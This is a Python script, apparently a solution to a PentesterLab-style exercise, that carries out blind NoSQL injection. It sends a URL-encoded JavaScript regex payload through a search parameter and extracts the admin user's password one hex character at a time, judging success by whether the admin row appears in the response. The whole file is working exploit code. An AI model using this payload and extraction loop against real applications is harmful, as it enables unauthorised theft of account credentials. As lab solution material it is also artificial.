import requests
import re


url='http://ptl-9cd23fff-ab831d2d.libcurl.so/?search=admin%27%20%26%26%20this.password.match(/^'
url_tail='/)%00'

sesh = requests.session()

chars_list=[]
for i in range(48,58):
	chars_list.append(chr(i))
for i in range(97,103):
	chars_list.append(chr(i))

keylen=len('XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX')
key=''
while 1:
	for i in chars_list:
		resp = sesh.get(url+key+i+url_tail)
		temp=re.findall('search=admin">admin</a></td>',resp.content.decode('latin-1'))
		if temp:
			#print(i)
			key+=i

	print(key)
	if (len(key) == 8) or (len(key) == 13) or (len(key) == 18) or (len(key) == 23):
		key+='-'
	if len(key) == keylen:
		break
	
			
